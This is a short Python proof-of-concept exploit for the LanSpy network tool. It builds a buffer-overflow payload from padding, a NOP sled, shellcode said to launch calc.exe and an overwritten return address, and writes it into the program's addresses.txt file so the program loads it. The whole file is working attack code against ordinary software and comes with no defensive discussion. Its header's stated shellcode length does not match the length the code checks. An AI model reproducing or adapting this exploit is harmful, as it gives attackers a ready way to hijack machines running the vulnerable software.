'''
Lanspy exploit calc.exe length 460byte shellcode
based off of DOS on exploit-db
https://www.exploit-db.com/exploits/38399/
@Iamdly
'''

import struct

scode = (
        "\x31\xC0\x50\x68"
        "\x63\x61\x6C\x63"
        "\x54\x5F\x50\x57"
        "\x35\xC3\x4E\xC3"
        "\x55\x35\x3C\x8A"
        "\x8D\x55\x50\xC3"
        )


eip = struct.pack('<I',0x004b3d4b) #call [ecx+b0]

offset = "A"*220 #offset to ecx+b0
nops = "\x90"*(680-len(offset)-len(scode))

payload = offset + nops + scode + eip 

if len(payload) != 684:
    print "Something wrong with length of payload"

with file('C:\\Program Files\\LanTricks\LanSpy\\addresses.txt', 'wb') as f:
    f.write(payload)
f.close()
